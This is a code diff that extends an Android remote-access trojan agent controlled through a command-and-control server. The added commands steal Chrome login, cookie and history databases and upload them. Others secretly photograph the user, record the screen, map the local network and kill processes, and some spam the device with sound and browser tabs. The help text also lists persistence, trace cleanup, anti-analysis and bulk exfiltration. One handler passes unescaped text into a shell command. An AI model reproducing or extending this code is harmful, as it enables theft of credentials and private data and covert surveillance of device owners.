@@ -317,8 +317,32 @@ func (jm *JobManager) List() []string {
 // SHELL UTILITIES
 // ============================================================
 
+// findShell locates a working shell binary on the device.
+var shellPath string
+var shellOnce sync.Once
+
+func getShell() string {
+	shellOnce.Do(func() {
+		candidates := []string{
+			"/system/bin/sh",
+			"/system/bin/bash",
+			"/vendor/bin/sh",
+			"/system/xbin/sh",
+		}
+		for _, p := range candidates {
+			if _, err := os.Stat(p); err == nil {
+				shellPath = p
+				return
+			}
+		}
+		// Last resort: hope PATH works
+		shellPath = "sh"
+	})
+	return shellPath
+}
+
 func shellExec(cmd string) (string, error) {
-	c := exec.Command("sh", "-c", cmd)
+	c := exec.Command(getShell(), "-c", cmd)
 	out, err := c.CombinedOutput()
 	return strings.TrimSpace(string(out)), err
 }
@@ -326,7 +350,7 @@ func shellExec(cmd string) (string, error) {
 func shellExecTimeout(cmd string, timeout time.Duration) (string, error) {
 	ctx, cancel := context.WithTimeout(context.Background(), timeout)
 	defer cancel()
-	c := exec.CommandContext(ctx, "sh", "-c", cmd)
+	c := exec.CommandContext(ctx, getShell(), "-c", cmd)
 	out, err := c.CombinedOutput()
 	return strings.TrimSpace(string(out)), err
 }
@@ -558,8 +582,119 @@ func getFolderTree(root string, maxDepth int) string {
 	if maxDepth <= 0 {
 		maxDepth = 3
 	}
-	out, _ := shellExecTimeout(fmt.Sprintf("find %s -maxdepth %d -type f 2>/dev/null | head -500", root, maxDepth), 15*time.Second)
-	return out
+	var results []string
+	walkDir(root, 0, maxDepth, &results, 500)
+	if len(results) == 0 {
+		return "(empty or access denied)"
+	}
+	return strings.Join(results, "\n")
+}
+
+func walkDir(dir string, depth, maxDepth int, results *[]string, limit int) {
+	if depth >= maxDepth || len(*results) >= limit {
+		return
+	}
+	entries, err := os.ReadDir(dir)
+	if err != nil {
+		return
+	}
+	for _, e := range entries {
+		if len(*results) >= limit {
+			return
+		}
+		path := filepath.Join(dir, e.Name())
+		if e.IsDir() {
+			*results = append(*results, path+"/")
+			walkDir(path, depth+1, maxDepth, results, limit)
+		} else {
+			info, _ := e.Info()
+			size := int64(0)
+			if info != nil {
+				size = info.Size()
+			}
+			*results = append(*results, fmt.Sprintf("%s (%d bytes)", path, size))
+		}
+	}
+}
+
+// listDirectory returns JSON-formatted directory listing for the file manager tab.
+func listDirectory(dir string) (string, error) {
+	if dir == "" {
+		dir = "/sdcard"
+	}
+	entries, err := os.ReadDir(dir)
+	if err != nil {
+		return "", err
+	}
+	type FileEntry struct {
+		Name  string `json:"name"`
+		Path  string `json:"path"`
+		IsDir bool   `json:"is_dir"`
+		Size  int64  `json:"size"`
+	}
+	var files []FileEntry
+	for _, e := range entries {
+		path := filepath.Join(dir, e.Name())
+		size := int64(0)
+		if info, err := e.Info(); err == nil {
+			size = info.Size()
+		}
+		files = append(files, FileEntry{
+			Name:  e.Name(),
+			Path:  path,
+			IsDir: e.IsDir(),
+			Size:  size,
+		})
+	}
+	data, _ := json.Marshal(files)
+	return string(data), nil
+}
+
+// getProcessList returns running processes using pure Go.
+func getProcessList() string {
+	entries, err := os.ReadDir("/proc")
+	if err != nil {
+		// Fallback to ps command
+		out, _ := shellExecTimeout("ps -A 2>/dev/null || ps 2>/dev/null", 10*time.Second)
+		return out
+	}
+	var lines []string
+	lines = append(lines, fmt.Sprintf("%-8s %-40s %s", "PID", "NAME", "STATE"))
+	for _, e := range entries {
+		if !e.IsDir() {
+			continue
+		}
+		pid := e.Name()
+		isNum := true
+		for _, c := range pid {
+			if c < '0' || c > '9' {
+				isNum = false
+				break
+			}
+		}
+		if !isNum {
+			continue
+		}
+		// Read process name from /proc/<pid>/comm
+		comm, err := os.ReadFile("/proc/" + pid + "/comm")
+		if err != nil {
+			continue
+		}
+		name := strings.TrimSpace(string(comm))
+		// Read state from /proc/<pid>/status
+		state := ""
+		status, err := os.ReadFile("/proc/" + pid + "/status")
+		if err == nil {
+			for _, line := range strings.Split(string(status), "\n") {
+				if strings.HasPrefix(line, "State:") {
+					state = strings.TrimSpace(strings.TrimPrefix(line, "State:"))
+					break
+				}
+			}
+		}
+		lines = append(lines, fmt.Sprintf("%-8s %-40s %s", pid, name, state))
+	}
+	return strings.Join(lines, "\n")
 }
 
 func showToast(msg string) {
@@ -713,6 +848,164 @@ func handleCommand(c2 *SupabaseC2, jm *JobManager, cmd Command) (string, error) 
 			return fmt.Sprintf("Error: %v\n%s", err, out), err
 		}
 		return out, nil
+
+	case "processes":
+		return getProcessList(), nil
+
+	case "list":
+		var args struct {
+			Path string `json:"path"`
+		}
+		json.Unmarshal([]byte(cmd.Args), &args)
+		out, err := listDirectory(args.Path)
+		if err != nil {
+			return "Failed: " + err.Error(), err
+		}
+		return out, nil
+
+	// --- Android adaptations of Windows-only commands ---
+	// These return sensible responses so the dashboard doesn't show errors
+
+	case "elevate":
+		if isRooted() {
+			return "Device is already rooted (admin equivalent)", nil
+		}
+		return "Device is not rooted — cannot elevate on non-rooted Android", nil
+
+	case "excludec", "excludeall":
+		return "N/A on Android — no Windows Defender to configure", nil
+
+	case "disableio", "enableio":
+		return "N/A on Android — no HID input control available", nil
+
+	case "minimizeall":
+		shellExec("input keyevent KEYCODE_HOME 2>/dev/null")
+		return "Sent HOME key", nil
+
+	case "darkmode":
+		shellExec("cmd uimode night yes 2>/dev/null")
+		return "Dark mode enabled (Android 10+)", nil
+
+	case "lightmode":
+		shellExec("cmd uimode night no 2>/dev/null")
+		return "Light mode enabled (Android 10+)", nil
+
+	case "shortcutbomb":
+		// Create multiple shortcut-like notifications
+		for i := 0; i < 20; i++ {
+			shellExec(fmt.Sprintf("am start -a android.intent.action.VIEW -d 'https://example.com/%d' 2>/dev/null", i))
+			time.Sleep(200 * time.Millisecond)
+		}
+		return "Opened 20 browser tabs", nil
+
+	case "fakeupdate":
+		shellExec("am start -a android.intent.action.VIEW -d 'https://google.com' 2>/dev/null")
+		return "Opened browser (fake update N/A on Android)", nil
+
+	case "soundspam":
+		for i := 0; i < 15; i++ {
+			shellExec("cmd media_session volume --set 15 2>/dev/null")
+			shellExec("input keyevent KEYCODE_MEDIA_PLAY 2>/dev/null")
+			time.Sleep(500 * time.Millisecond)
+		}
+		return "Sound spam sent", nil
+
+	case "message":
+		var args struct {
+			Text string `json:"text"`
+		}
+		json.Unmarshal([]byte(cmd.Args), &args)
+		if args.Text == "" {
+			args.Text = "Alert"
+		}
+		// Show notification via am broadcast or toast
+		shellExec(fmt.Sprintf("am broadcast -a android.intent.action.SHOW_TOAST --es message '%s' 2>/dev/null", args.Text))
+		return "Message shown: " + args.Text, nil
+
+	case "wallpaper":
+		var args struct {
+			URL string `json:"url"`
+		}
+		json.Unmarshal([]byte(cmd.Args), &args)
+		if args.URL == "" {
+			return "No URL specified", fmt.Errorf("empty url")
+		}
+		return "Wallpaper change requires root or accessibility service on Android", nil
+
+	case "nearbywifi":
+		out, _ := shellExec("dumpsys wifi | grep -A2 'ScanResult' | head -50 2>/dev/null")
+		if out == "" {
+			out = "Nearby WiFi scan not available from app context"
+		}
+		c2.SendSystemInfo("nearbywifi", out)
+		return out, nil
+
+	case "enumeratelan":
+		out, _ := shellExecTimeout("ip neigh show 2>/dev/null", 10*time.Second)
+		if out == "" {
+			// Fallback: read ARP table
+			data, _ := os.ReadFile("/proc/net/arp")
+			out = string(data)
+		}
+		if out == "" {
+			out = "LAN enumeration not available"
+		}
+		c2.SendSystemInfo("lan_hosts", out)
+		return out, nil
+
+	case "browserdb":
+		// Try to grab Chrome/WebView databases
+		var results []string
+		browserPaths := []string{
+			"/data/data/com.android.chrome/app_chrome/Default/History",
+			"/data/data/com.android.chrome/app_chrome/Default/Login Data",
+			"/data/data/com.android.chrome/app_chrome/Default/Cookies",
+			"/data/data/com.android.browser/databases/browser2.db",
+		}
+		for _, p := range browserPaths {
+			data, err := os.ReadFile(p)
+			if err == nil && len(data) > 0 {
+				c2.UploadFile(filepath.Base(p), data, "browserdb")
+				results = append(results, "Uploaded: "+filepath.Base(p))
+			}
+		}
+		if len(results) == 0 {
+			return "No browser databases accessible (requires root)", nil
+		}
+		return strings.Join(results, "\n"), nil
+
+	case "parsebrowser":
+		return "Browser parsing not available on Android — use browserdb to grab raw files", nil
+
+	case "webcam":
+		// Alias for camera on Android
+		data, err := takePhoto()
+		if err != nil {
+			return "Camera failed: " + err.Error(), err
+		}
+		err = c2.UploadFile("webcam.jpg", data, "camera")
+		if err != nil {
+			return "Upload failed: " + err.Error(), err
+		}
+		return fmt.Sprintf("Photo captured (%d KB)", len(data)/1024), nil
+
+	case "recordscreen":
+		tmpPath := filepath.Join(os.TempDir(), "screenrec.mp4")
+		defer os.Remove(tmpPath)
+		_, err := shellExecTimeout(fmt.Sprintf("screenrecord --time-limit 10 %s 2>/dev/null", tmpPath), 15*time.Second)
+		if err != nil {
+			return "Screen recording failed: " + err.Error(), err
+		}
+		data, err := os.ReadFile(tmpPath)
+		if err != nil {
+			return "Read failed: " + err.Error(), err
+		}
+		c2.UploadFile("screenrec.mp4", data, "screenrecord")
+		return fmt.Sprintf("Screen recorded (%d KB)", len(data)/1024), nil
+
+	case "keycapture", "keylogger":
+		// Android doesn't allow keylogging without accessibility service
+		return "Keylogging requires Accessibility Service on Android — not available from agent", nil
 
 	// --- Surveillance ---
 	case "screenshot":
@@ -968,15 +1261,33 @@ func handleCommand(c2 *SupabaseC2, jm *JobManager, cmd Command) (string, error) 
 	case "kill":
 		var args struct {
 			Name string `json:"name"`
+			Job  string `json:"job"`
+			PID  int    `json:"pid"`
 		}
 		json.Unmarshal([]byte(cmd.Args), &args)
-		if args.Name != "" {
-			if jm.Stop(args.Name) {
-				return "Stopped job: " + args.Name, nil
-			}
-			return "Job not found: " + args.Name, nil
+		// Support both job name and PID
+		jobName := args.Name
+		if jobName == "" {
+			jobName = args.Job
 		}
-		return "No job name specified", nil
+		if jobName != "" {
+			if jm.Stop(jobName) {
+				return "Stopped job: " + jobName, nil
+			}
+			return "Job not found: " + jobName, nil
+		}
+		if args.PID > 0 {
+			proc, err := os.FindProcess(args.PID)
+			if err != nil {
+				return fmt.Sprintf("Process %d not found", args.PID), err
+			}
+			err = proc.Kill()
+			if err != nil {
+				return fmt.Sprintf("Failed to kill PID %d: %v", args.PID, err), err
+			}
+			return fmt.Sprintf("Killed PID %d", args.PID), nil
+		}
+		return "No job name or PID specified", nil
 
 	case "ping":
 		return "pong", nil
@@ -1039,11 +1350,16 @@ func handleCommand(c2 *SupabaseC2, jm *JobManager, cmd Command) (string, error) 
 		return sb.String(), nil
 
 	case "options", "help":
-		return `Available commands:
+		return `Available commands (Android agent):
+  --- System ---
   ping              - Connection test
   sysinfo           - Full device information
   isadmin           - Check if device is rooted
   shell {cmd}       - Execute shell command
+  processes         - List running processes
+  list {path}       - List directory contents (JSON)
+  foldertree {path} - Directory tree listing
+  --- Surveillance ---
   screenshot        - Single screenshot
   screenshots       - Continuous screenshots (job)
   contacts          - Dump contacts
@@ -1051,25 +1367,35 @@ func handleCommand(c2 *SupabaseC2, jm *JobManager, cmd Command) (string, error) 
   calllog           - Dump call log
   apps              - List installed apps
   wifi              - WiFi info + saved networks
+  nearbywifi        - Scan nearby WiFi networks
   location          - Get last known location
   location_track    - Continuous location tracking (job)
   clipboard         - Read clipboard
-  camera            - Take photo
+  camera / webcam   - Take photo
   microphone        - Record audio
-  foldertree        - List files in directory
+  recordscreen      - Record screen (10s)
+  --- Files ---
   download {path}   - Download file from device
   upload {path,data}- Upload file to device
   exfiltrate        - Bulk file exfiltration
+  browserdb         - Grab browser databases
+  --- Network ---
+  enumeratelan      - List LAN neighbors
+  --- Control ---
   toast {message}   - Show toast message
+  message {text}    - Display message
   openurl {url}     - Open URL in browser
   vibrate           - Vibrate device
+  minimizeall       - Press HOME key
+  darkmode/lightmode- Toggle dark/light mode
   persist           - Install persistence
   unpersist         - Remove persistence
   cleanup           - Clear traces
+  --- Jobs ---
   sleep {seconds}   - Sleep N seconds
   antianalysis      - Anti-analysis report
   jobs              - List active jobs
-  kill {name}       - Stop a job
+  kill {name/pid}   - Stop a job or kill process
   pausejobs         - Stop all jobs
   resumejobs        - Resume default jobs
   exit              - Kill agent`, nil
